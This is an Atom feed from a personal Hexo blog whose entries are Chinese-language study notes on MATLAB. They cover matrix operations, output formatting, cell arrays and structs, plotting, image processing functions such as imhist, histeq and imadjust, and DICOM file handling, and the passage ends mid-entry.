<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2020-02-10T06:50:40.936Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>matlab图像示例笔记2</title>
    <link href="http://finsenty54.github.io/2020/02/10/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B03/"/>
    <id>http://finsenty54.github.io/2020/02/10/matlab图像示例笔记3/</id>
    <published>2020-02-10T06:47:00.000Z</published>
    <updated>2020-02-10T06:50:40.936Z</updated>
    
    <content type="html"><![CDATA[<p><code>mat2gray</code> 将dicom变为grey<br><code>im2uint8</code></p><hr><a id="more"></a><p> The image on the right has higher contrast, <code>with intensity values that fill the entire intensity range [0, 255].</code></p><hr><p><del>如果指定空矩阵 ([])，则 imshow 使用 [min(I(:)) max(I(:))]。换言之，使用 I 中的最小值作为黑色，使用最大值作为白色。</del></p><hr><p>imadjust<br>You must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. </p><hr><p>figure<code>,</code>imshow(pout_histeq)<code>;</code><br>title(‘Histeq’);</p><hr><p>ROI<br>Create a Binary Mask<br>You can use the createMask function of the imroi base class to create a binary mask for any type of ROI object — impoint, imline, imrect, imellipse, impoly, or imfreehand. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;mat2gray&lt;/code&gt; 将dicom变为grey&lt;br&gt;&lt;code&gt;im2uint8&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab图像示例笔记3</title>
    <link href="http://finsenty54.github.io/2020/02/07/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B02/"/>
    <id>http://finsenty54.github.io/2020/02/07/matlab图像示例笔记2/</id>
    <published>2020-02-07T08:23:56.000Z</published>
    <updated>2020-02-10T06:50:50.700Z</updated>
    
    <content type="html"><![CDATA[<h4 id="dicom-（a-image-type-using-in-medical"><a href="#dicom-（a-image-type-using-in-medical" class="headerlink" title="dicom （a image type using in medical)"></a>dicom （a image type using in medical)</h4><p>To read <code>metadata</code>from a DICOM file, use the <code>dicominfo function</code></p><hr><p>To read<code>image data</code>from a DICOM file, use the <code>dicomread function.</code></p><a id="more"></a><hr><p>If you just want to view the <code>metadata in a DICOM file</code>, for debugging purposes, you can use the<code>dicomdisp function.</code></p><hr><p>use one of the toolbox image display functions <code>imshow or imtool.</code></p><hr><p>the image data in this DICOM file is signed <code>16-bit data</code>, you must use the autoscaling syntax with either display function to make the image viewable.<br><code>imshow(I,&#39;DisplayRange&#39;,[])</code></p><hr><p>use the <code>dicomanon function</code>. Remove Confidential Information</p><hr><p>To write image data or metadata to a file in DICOM format, use the <code>dicomwrite function</code>.</p><hr><h4 id="Create-New-DICOM-Series"><a href="#Create-New-DICOM-Series" class="headerlink" title="Create New DICOM Series"></a>Create New DICOM Series</h4><pre><code>info.SeriesInstanceUID</code></pre><p>Generate a new DICOM unique identifier (UID) using the <code>dicomuid function.</code></p><pre><code>uid = dicomuidinfo.SeriesInstanceUID = uid;dicomwrite(Imodified,&apos;ankle_newseries.dcm&apos;,info);</code></pre><hr><p>The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white <code>text characters</code>are<code>set to the maximum pixel value</code>. </p><hr><p>MATLAB command prompt: Enter dicomBrowser.</p><hr><p><a href="https://ww2.mathworks.cn/help/releases/R2018a/images/image-type-conversions.html" title="Image Type Conversion" target="_blank" rel="noopener">Image Type Conversion</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;dicom-（a-image-type-using-in-medical&quot;&gt;&lt;a href=&quot;#dicom-（a-image-type-using-in-medical&quot; class=&quot;headerlink&quot; title=&quot;dicom （a image type using in medical)&quot;&gt;&lt;/a&gt;dicom （a image type using in medical)&lt;/h4&gt;&lt;p&gt;To read &lt;code&gt;metadata&lt;/code&gt;from a DICOM file, use the &lt;code&gt;dicominfo function&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;To read&lt;code&gt;image data&lt;/code&gt;from a DICOM file, use the &lt;code&gt;dicomread function.&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab图像示例笔记1</title>
    <link href="http://finsenty54.github.io/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/"/>
    <id>http://finsenty54.github.io/2020/02/06/matlab图像示例笔记1/</id>
    <published>2020-02-06T06:30:11.000Z</published>
    <updated>2020-02-06T06:30:57.460Z</updated>
    
    <content type="html"><![CDATA[<h3 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h3><p>histogram  直方图<br>Precede the call to <code>imhist</code>with the <code>figure</code>command so that the histogram does not overwrite the display of the image I in the current figure window.</p><p>To see the distribution of intensities in the image, <code>create a histogram by calling the imhist</code> function.<br>输入图片，图片要求为灰度图或者二值图 imhist<br><a id="more"></a><br>    F=imread(‘test.jpg’);<br>    I=rgb2gray(F);<br>    [count,x]=imhist(I，30)</p><p><del>% 获取直方图的横坐标和纵坐标，即各个像素级，以及每个像素级上的像素出现的次数<br>figure;</del></p><pre><code>subplot(221);imhist(I,2);subplot(222);imhist(I,5);subplot(223);imhist(I,10);subplot(224);imhist(I);figure;subplot(121); imhist(I,10)[count,x] = imhist(I,10)subplot(122);stem(x,count);</code></pre><blockquote><p>stem<br>绘制离散序列数据</p></blockquote><p><code>Improve the contrast</code>in an image, using the <code>histeq function</code>. The toolbox includes several other functions that perform contrast adjustment, including <code>imadjust</code> and <code>adapthisteq</code>, and interactive tools such as the Adjust Contrast tool, available in the Image Viewer<br>adjust the contrast </p><blockquote><p>灰度直方图均衡化histeq</p></blockquote><hr><h3 id="Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects"><a href="#Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects" class="headerlink" title="Correct Nonuniform Background Illumination and Analyze Foreground Objects"></a>Correct Nonuniform Background Illumination and Analyze Foreground Objects</h3><p>nonuniform</p><blockquote><p>strel（）<br>Morphological structuring element</p></blockquote><p><code>J = imopen(I,SE)</code>performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the <code>strel or offsetstrel functions</code>. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations.</p><p>surf<br>曲面图全页折叠<br>语法<br>surf(X,Y,Z)<br>surf(X,Y,Z,C)</p><p><code>f1=imadjust（f，[low_in  high_in],[low_out  high_out],gamma）</code><br>该函数的意义如图1所示，把图像f 灰度变换到新图像f1的过程中，f 中灰度值<code>低于low_in</code>的像素点在f1中灰度值被赋值为<code>low_out</code>,同理，f中灰度值<code>高于high_in</code>的像素点变换到f1时其灰度值也被赋值为<code>high_out</code>;</p><blockquote><p>J=imadjust(I,[0.2 0.5],[0 1])<br>原图像灰度范围为0-255，程序将小于255×0.2的灰度值设置为0，将大于255×0.5的灰度值设置为255</p></blockquote><p>饱和度取决于该色中含色成分和消色成分（灰色）的比例<br>比度指的是一幅图像中明暗区域最亮的白和最暗的黑之间不同亮度层级的测量，差异范围越大代表对比越大</p><p>Use the<code>imbinarize function</code> to convert the grayscale image into a<code>binary image</code></p><p><code>Remove background noise</code> from the image with the<code>bwareaopen function</code>.</p><p>F = false(sz1,…,szN) 是由逻辑值“0”组成的 sz1×…×szN 数组，其中 sz1,…,szN 表示每个维度的大小。例如，false(2,3) 返回由逻辑值“0”组成的 2×3 数组。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;对比度&quot;&gt;&lt;a href=&quot;#对比度&quot; class=&quot;headerlink&quot; title=&quot;对比度&quot;&gt;&lt;/a&gt;对比度&lt;/h3&gt;&lt;p&gt;histogram  直方图&lt;br&gt;Precede the call to &lt;code&gt;imhist&lt;/code&gt;with the &lt;code&gt;figure&lt;/code&gt;command so that the histogram does not overwrite the display of the image I in the current figure window.&lt;/p&gt;
&lt;p&gt;To see the distribution of intensities in the image, &lt;code&gt;create a histogram by calling the imhist&lt;/code&gt; function.&lt;br&gt;输入图片，图片要求为灰度图或者二值图 imhist&lt;br&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab笔记5 image</title>
    <link href="http://finsenty54.github.io/2020/02/05/matlab%E7%AC%94%E8%AE%B05/"/>
    <id>http://finsenty54.github.io/2020/02/05/matlab笔记5/</id>
    <published>2020-02-05T05:41:19.000Z</published>
    <updated>2020-02-05T05:42:28.598Z</updated>
    
    <content type="html"><![CDATA[<p>使用基于帕斯卡三角形的项创建一个对称矩阵：<br><code>A = pascal(3)</code></p><p>randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。<br><code>C = randi(10,3,2)</code></p><p>有一个专门的点积函数，称为 <code>dot</code>。<br><a id="more"></a><br>非共轭复数转置（其中每个元素的复数部分保留其符号）表示为<code>z.&#39;</code></p><p><code>eye(m,n)</code><br>返回 m×n 矩形单位矩阵，eye(n) 返回 n×n 单位方阵。</p><p>向量 x 的 p-范数，<br><code>norm(x,p)</code> 进行计算，此运算是为 p &gt; 1 的任意值定义的，但最常见的 p 值为 1、2 和 ∞。默认值为 p = 2，</p><p><code>x = b/A</code><br>表示使用 mrdivide 获得的矩阵方程 xA = b 的解。<br><code>x = A\b</code><br>表示使用 mldivide 获得的矩阵方程 Ax = b 的解。</p><p><code>(b/A)&#39; = (A&#39;\b&#39;)</code>.<br>m = n<br>方阵方程组。求精确解。<br>m &gt; n<br>超定方程组，即方程个数多于未知数个数。求最小二乘解。<br>m &lt; n<br>欠定方程组，即方程个数少于未知数个数。使用最多 m 个非零分量求基本解。</p><p><em>非奇异矩阵==可逆矩阵</em></p><p><code>eig</code><br>特征值和特征向量</p><p>提供的数据分析函数的列表，请键入<br><code>help datafun</code></p><hr><h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><p>要显示图像，请使用 imshow 函数：<br><code>imshow(X,map)</code><br>使用<code>imread</code> 函数可以读取标准图像文件（TIFF、JPEG、PNG 等）。imread 返回的数据类型取决于读取的图像类型。<br>使用<code>imwrite</code> 函数可以将 MATLAB 数据写入到各种标准图像格式。<br>大多数图像表示为二维数组（矩阵），其中矩阵的每个元素对应所显示图像的一个像素。例如，由 200 行和 300 列不同颜色的点组成的图像保存为一个 200×300 的矩阵。有些图像，如 RGB，需要三维数组，其中三个维度的第一个平面表示红色像素强度，第二个平面表示绿色像素强度，第三个平面表示蓝色像素强度。<br>MATLAB 数学支持三种不同的数值类用于图像显示：<br>双精度浮点数（double）<br>16 位无符号整数（uint16）<br>8 位无符号整数（uint8）</p><pre><code>imshow    显示图像image    从数组显示图像imagesc    显示使用经过标度映射的颜色的图像imread    从图形文件读取图像imresize    调整图像大小imwrite    将图像写入图形文件imfinfo    有关图形文件的信息imformats    管理图像文件格式注册表frame2im    返回与影片帧关联的图像数据im2frame    将图像转换为影片帧im2java    将图像转换 Java 图像im2double    将图像转换为双精度值ind2rgb    将索引图像转换为 RGB 图像rgb2gray    将 RGB 图像或颜色图转换为灰度图rgb2ind    将 RGB 图像转换为索引图像imapprox    通过减少颜色数量来近似处理索引图像dither    转换图像，通过抖动提高表观颜色分辨率cmpermute    重新排列颜色图中的颜色cmunique    消除颜色图中的重复颜色；将灰度或真彩色图像转换为索引图像</code></pre><p><code>A = imread(&#39;ngc6543a.jpg&#39;);</code></p><hr><p>索引图像由数据矩阵 X 和颜色图矩阵 map 组成。map 是一个 double 类的 m×3 数组，由 [0, 1] 范围内的浮点值组成。map 的每一行指定单一颜色的红、绿和蓝分量。索引图像使用像素值到颜色图值的“直接映射”。每个图像像素的颜色是以 X 中的对应值为索引求得的 map 中的值。<strong>因此 X 值必须是整数。值 1 指向 map 中第一行，值 2 指向第二行，以此类推。使用以下语句显示索引图像。</strong><br><code>image(X); colormap(map)</code><br>图像矩阵和颜色图中值的关系取决于图像矩阵的类。如果图像矩阵是 double 类，那么值 1 指向颜色图中的第一行，值 2 指向第二行，以此类推。如果图像矩阵是 uint8 或 uint16 类，那么有个偏移 - 值 0 指向颜色图中的第一行，值 1 指向第二行，以此类推。在图形文件格式中使用偏移是为了使可支持的颜色数目达到最大。在上面的图像中，图像矩阵是 double 类。</p><hr><p>强度图像是一个数据矩阵 I，其中的值表示某一范围内的强度。强度图像表示为单个矩阵，矩阵的每个元素对应一个图像像素。<br>imagesc(A); colormap(gray)<br>imagesc(A,[min(A(:)) max(A(:))]); colormap(gray)</p><hr><p>bit-depth：使用多少位来定义一个像素点。bit-depth越大，可以表示的色彩就越多。通常情况下，图像的像素值范围为0-255， 则其bit-depth就是8。RGB图像的bit-depth为24：8bit表示R，8bit表示G，8bit表示B。</p><p>RGB 图像，有时称为真彩色图像，以 m×n×3 数据数组形式存储，该数组定义了对应图像每个像素的红色、绿色和蓝色分量。<br><strong>例如像素 (10,5) 的红色、绿色和蓝色分量分别存储在 RGB(10,5,1)、RGB(10,5,2) 和 RGB(10,5,3) 中。</strong></p><hr><p>您可以对 uint8 和 uint16 数组执行其他几种操作，包括：<br>使用 reshape、cat、permute 函数以及 [] 和 ‘ 运算符重构、重新排序和串联数组<br>使用 save 和 load 将 uint8 和 uint16 数组保存及加载到 MAT 文件。（请记住，如果要加载或保存图形格式文件图像，则必须使用 imread 和imwrite 命令代替。）<br>使用 find 定位 uint8 和 uint16 数组中非零元素的索引。但返回的数组始终为 double 类。<br>关系运算符</p><p>基于 NTSC 标准合并 RGB 值，以此方式来计算单色亮度，这会将与眼睛敏感度相关的系数应用到 RGB 颜色：</p><pre><code>I = .2989*rgb_img(:,:,1)...    +.5870*rgb_img(:,:,2)...    +.1140*rgb_img(:,:,3);</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用基于帕斯卡三角形的项创建一个对称矩阵：&lt;br&gt;&lt;code&gt;A = pascal(3)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。&lt;br&gt;&lt;code&gt;C = randi(10,3,2)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有一个专门的点积函数，称为 &lt;code&gt;dot&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab笔记4</title>
    <link href="http://finsenty54.github.io/2020/02/03/matlab%E7%AC%94%E8%AE%B04/"/>
    <id>http://finsenty54.github.io/2020/02/03/matlab笔记4/</id>
    <published>2020-02-03T05:12:21.000Z</published>
    <updated>2020-02-03T05:13:01.660Z</updated>
    
    <content type="html"><![CDATA[<pre><code>B = A - 8.5B(1:2,2:3) = 0x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8];x = x(isfinite(x))x =  2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8x = x(abs(x-mean(x)) &lt;= 3*std(x))x =  2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8</code></pre><a id="more"></a><hr><p>find 函数可用于确定与指定逻辑条件相符的数组元素的索引。find 以最简单的形式返回索引的列向量。转置该向量以便获取索引的行向量。</p><pre><code>k = find(isprime(A))&apos;k =     2     5     9    10    11    13</code></pre><p><code>R = randn(3,4,5);</code></p><hr><p>MATLAB 中的元胞数组是以其他数组的副本为元素的多维数组<br><code>C = {A sum(A) prod(prod(A))}</code><br>。第一，要检索某个元胞的内容，请在花括号中使用下标。例如，C{1} 检索幻方矩阵，C{3} 为 16!。第二，<strong>元胞数组包含其他数组的副本，而不包含指向这些数组的指针</strong>。</p><pre><code>M = cell(8,1); 元胞数组for n = 1:8   M{n} = magic(n);endM</code></pre><hr><p><code>v = [s; &#39;world&#39;]</code><br>垂直联接字符并生成</p><pre><code>v =   Hello   world</code></pre><p>char 函数可执行这种填充操作。例如，<br><code>S = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;)</code></p><p>也可以将文本存储在元胞数组中。例如，</p><p><code>C = {&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;}</code></p><p>可以将填充后的字符数组转换为字符向量元胞数组：<br><code>C = cellstr(S)</code><br>使用以下语句可以逆转此过程<br><code>S = char(C)</code></p><hr><p>结构体是多维 MATLAB 数组，包含可按文本字段标志符访问的元素。例如，</p><pre><code>S.name = &apos;Ed Plum&apos;;S.score = 83;S.grade = &apos;B+&apos;S =      name: &apos;Ed Plum&apos;    score: 83    grade: &apos;B+&apos;</code></pre><p>可以一次添加一个字段，</p><pre><code>S(2).name = &apos;Toni Miller&apos;;S(2).score = 91;S(2).grade = &apos;A-&apos;;</code></pre><p>可以使用一个语句添加整个元素：</p><pre><code>S(3) = struct(&apos;name&apos;,&apos;Jerry Garcia&apos;,...                &apos;score&apos;,70,&apos;grade&apos;,&apos;C&apos;)</code></pre><p>键入<br><code>S.score</code><br>与键入<br><code>S(1).score, S(2).score, S(3).score</code><br>相同，这是一个逗号分隔列表。</p><pre><code>scores = [S.score]names = char(S.name)names = {S.name}[N1 N2 N3] = S.name</code></pre><p>访问结构体数据的另一种方法是使用动态字段名称。这些名称将字段表示为变量表达式，MATLAB 会在运行时计算这些表达式。此处显示的点-括号语法将 expression 作为动态字段名称：<br><code>structName.(expression)</code><br>例如，要在字段名称中计算 expression，并在行 7 中的 1 至 25 列内获取该字段的值，请使用<br><code>structName.(expression)(7,1:25)</code></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;B = A - 8.5
B(1:2,2:3) = 0
x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8];
x = x(isfinite(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8
x = x(abs(x-mean(x)) &amp;lt;= 3*std(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab笔记3</title>
    <link href="http://finsenty54.github.io/2020/02/02/matlab%E7%AC%94%E8%AE%B03/"/>
    <id>http://finsenty54.github.io/2020/02/02/matlab笔记3/</id>
    <published>2020-02-02T06:12:38.000Z</published>
    <updated>2020-02-02T06:13:25.447Z</updated>
    
    <content type="html"><![CDATA[<p>科学记数法使用字母 e 来指定 10 次方的缩放因子<br>浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位</p><pre><code>x = uint64(36028797018963968);y = uint64(36028797018963972);</code></pre><a id="more"></a><hr><p>例如，sort 函数根据量值进行排序，如果量值相等，则根据相位角度排序。</p><pre><code>sort([3+4i, 4+3i])  量值都为5ans =   4.0000 + 3.0000i   3.0000 + 4.0000iangle(3+4i)ans =    0.9273</code></pre><p>“等于”关系运算符 == 要求实部和虚部相等。其他二进制关系运算符 &gt;、&lt;、&gt;= 和 &lt;= 忽略数字的虚部，而仅考虑实部。</p><hr><p>数组运算对构建表非常有用。假定 n 为列向量<br><code>n = (0:9)&#39;;</code><br>然后，<br><code>pows = [n  n.^2  2.^n]</code><br>构建一个平方和 2 次幂的表：</p><pre><code>pows =     0     0     1     1     1     2     2     4     4     3     9     8     4    16    16     5    25    32     6    36    64     7    49   128     8    64   256     9    81   512</code></pre><hr><pre><code>format short gx = (1:0.1:2)&apos;;logs = [x log10(x)]</code></pre><p>构建一个对数表。</p><pre><code>logs =     1.0            0      1.1      0.04139     1.2      0.07918     1.3      0.11394     1.4      0.14613     1.5      0.17609     1.6      0.20412     1.7      0.23045     1.8      0.25527     1.9      0.27875     2.0      0.30103</code></pre><hr><p>有关初等数学函数的列表，请键入<br>help elfun<br>有关更多高等数学函数和矩阵函数的列表，请键入<br>help specfun<br>help elmat</p><hr><p>format 函数控制所显示的值的数值格式。</p><pre><code>x = [4/3 1.2345e-6]format short   1.3333    0.0000format short e   1.3333e+000  1.2345e-006format short g   1.3333  1.2345e-006format long   1.33333333333333   0.00000123450000format long e   1.333333333333333e+000    1.234500000000000e-006format long g   1.33333333333333               1.2345e-006format bank   1.33          0.00format rat   4/3          1/810045format hex   3ff5555555555555   3eb4b6231abfd271</code></pre><p>语句无法容纳在一行中，请使用省略号（三个句点）<strong>…</strong></p><p>要进一步控制输出格式，请使用 sprintf 和 fprintf 函数。</p><hr><pre><code>100:-7:50sum(A(1:4,4))sum(A(:,end)) end 引用最后一个行或列</code></pre><p>为什么 4×4 幻方矩阵的幻数和等于 34？如果将介于 1 到 16 之间的整数分为四个总和相等的组，该总和必须为<br>sum(1:16)/4<br>当然，也即<br>ans =<br>     34</p><p><code>B = [A  A+32; A+48  A+16]</code></p><hr><p>要删除 X 的第二列，请使用<br><code>X(:,2) = []</code></p><p><code>X( 2 : 2 : 10) = []</code> 按列数第几个<br>生成<br><code>X =    16     9     2     7    13    12     1</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;科学记数法使用字母 e 来指定 10 次方的缩放因子&lt;br&gt;浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x = uint64(36028797018963968);
y = uint64(36028797018963972);
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab笔记2</title>
    <link href="http://finsenty54.github.io/2020/02/01/matlab%E7%AC%94%E8%AE%B02/"/>
    <id>http://finsenty54.github.io/2020/02/01/matlab笔记2/</id>
    <published>2020-02-01T11:17:59.000Z</published>
    <updated>2020-02-02T06:12:27.923Z</updated>
    
    <content type="html"><![CDATA[<p>处理文本时，将字符序列括在单引号中。可以将文本赋给变量。<br><code>myText = &#39;Hello, world&#39;;</code><br>如果文本包含单引号，使用两个单引号。</p><pre><code>otherText = &apos;You&apos;&apos;re right&apos;otherText = &apos;You&apos;re right&apos;</code></pre><hr><a id="more"></a><p><code>whos</code>查询已有变量</p><hr><p>可以使用方括号串联字符数组，就像串联数值数组一样。<br><code>longText = [myText,&#39; - &#39;,otherText]</code></p><p>要将数值转换为字符，使用 num2str 或 int2str 等函数。</p><pre><code>f = 71;c = (f-32)/1.8;tempText = [&apos;Temperature is &apos;,num2str(c),&apos;C&apos;]</code></pre><hr><p>调用函数，例如 max，请将其输入参数括在圆括号中，存在多个输入参数，请使用逗号加以分隔，存在多个输出参数，请将其括在方括号中：</p><pre><code>[maxA,location] = max(A)maxA = 5location = 3</code></pre><hr><p>任何字符输入括在单引号中：<br><code>disp(&#39;hello world&#39;)</code></p><hr><p>创建二维线图，请使用 plot（绘制） 函数。</p><pre><code>x = 0:pi/100:2*pi; 创建矩阵的一种方法y = sin(x);plot(x,y）</code></pre><p>标记轴并添加标题。</p><pre><code>xlabel(&apos;x&apos;)ylabel(&apos;sin(x)&apos;)title(&apos;Plot of the Sine Function&apos;)</code></pre><p>向 plot 函数添加第三个输入参数，您可以使用红色虚线绘制相同的变量。<br><code>plot(x,y,&#39;r--&#39;)</code><br>‘r–’ 为线条设定。每个设定可包含表示线条颜色、样式和标记的字符。标记是在绘制的每个数据点上显示的符号，例如，+、o 或 <em>。例如，’g:</em>‘ 请求绘制使用 * 标记的绿色点线。</p><p>将绘图添加到现有图窗中，请使用 hold on。在使用 hold off 或关闭窗口之前，当前图窗窗口中会显示所有绘图</p><pre><code>hold ony2 = cos(x);plot(x,y2,&apos;:&apos;)legend(&apos;sin&apos;,&apos;cos&apos;) legend就是添加图例的标注比如：legend(&apos;First&apos;,&apos;Second&apos;,-1)，表示字符串依次注释plot中的图，后面板的参数（此处是-1）表示注释的位置。hold off</code></pre><hr><p>三维图通常显示一个由带两个变量的函数（即 z = f (x,y)）定义的曲面图。</p><p><code>[X,Y] = meshgrid(-2:.2:2);</code> STEP=0.2  meshgrid函数生成的X，Y是大小相等的矩阵</p><p>surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p><hr><p>使用 subplot 函数可以在同一窗口的不同子区域显示多个绘图。<br>subplot 的前两个输入表示每行和每列中的绘图数。第三个输入指定绘图是否处于活动状态。</p><hr><blockquote><p>键入脚本名称即可运行该脚本。脚本是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为<code>.m</code>的文件。在命令行中<em>键入脚本名称</em>即可运行该脚本。<br>要创建脚本，请使用 edit 命令。<br><code>edit plotrand</code><br>使用百分比 (%) 符号添加注释</p></blockquote><hr><pre><code>nsamples = 5;npoints = 50;for k = 1:nsamples    currentData = rand(npoints,1);    sampleMean(k) = mean(currentData);endoverallMean = mean(sampleMean)if overallMean &lt; .49   disp(&apos;Mean is less than expected&apos;)elseif overallMean &gt; .51   disp(&apos;Mean is greater than expected&apos;)else   disp(&apos;Mean is within the expected range&apos;)end</code></pre><hr><p>使用 doc 命令在单独的窗口中打开函数文档。<br><code>doc mean</code><br>在键入函数输入参数的左括号之后暂停，此时命令行窗口中会显示相应函数的提示<br>使用 help 命令可在命令行窗口中查看相应函数的简明文档。</p><hr><p>使用空格或逗号分隔行的元素。<br>使用分号 ; 表示每行末尾。<br>使用方括号 [ ] 将整个元素列表括起来。</p><p>sum(A) 计算列<br>sum(A’)’<br>避免双重转置的其他方法，请在 sum 函数中使用维度参数：<br><code>sum(A,2)</code></p><p><code>diag(A)</code> 获取对角线值</p><hr><p>图形的函数 fliplr 可以从左往右地翻转矩阵：<br><code>sum(diag(fliplr(A)))</code></p><hr><p>magic 函数创建几乎任意大小的幻方矩阵。行列对角线相加都相同<br>四个用于生成基本矩阵的函数。<br>zeros<br>全部为零<br>ones<br>全部为 1<br>rand<br>均匀分布的随机元素<br>randn<br>正态分布的随机元素</p><hr><p>MATLAB 不需要任何类型声明或维度说明。当 MATLAB 遇到新的变量名称时，它会自动创建变量，并分配适当大小的存储。如果此变量已存在，MATLAB 会更改其内容，并根据需要分配新存储。</p><p>MATLAB 仅使用名称的前 N 个字符（其中 N 是函数 namelengthmax 返回的数字） 为63</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;处理文本时，将字符序列括在单引号中。可以将文本赋给变量。&lt;br&gt;&lt;code&gt;myText = &amp;#39;Hello, world&amp;#39;;&lt;/code&gt;&lt;br&gt;如果文本包含单引号，使用两个单引号。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;otherText = &amp;apos;You&amp;apos;&amp;apos;re right&amp;apos;
otherText = 
&amp;apos;You&amp;apos;re right&amp;apos;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>matlab笔记1</title>
    <link href="http://finsenty54.github.io/2020/01/30/matlab%E7%AC%94%E8%AE%B01/"/>
    <id>http://finsenty54.github.io/2020/01/30/matlab笔记1/</id>
    <published>2020-01-30T11:49:15.000Z</published>
    <updated>2020-01-30T11:55:39.032Z</updated>
    
    <content type="html"><![CDATA[<p><code>a = [1 2 3 4]</code><br>创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。<br><code>z = zeros(5,1)</code></p><hr><p>MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。<br><code>a + 10</code></p><hr><a id="more"></a><p>要转置矩阵，请使用单引号 (‘)</p><hr><p>format 命令可以显示更多小数位数：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a*inv(a)</span><br><span class="line">format short</span><br></pre></td></tr></table></figure></p><p>format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。</p><hr><p>要执行元素级乘法（而非矩阵乘法），请使用 .<em> 运算符：<br>`p = a.</em>a<code>乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：</code>a.^3`</p><hr><p>串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。<br><code>A = [a,a]</code></p><hr><p>使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。<br><code>A = [a; a]</code></p><hr><p>要表示复数的虚部，请使用 i 或 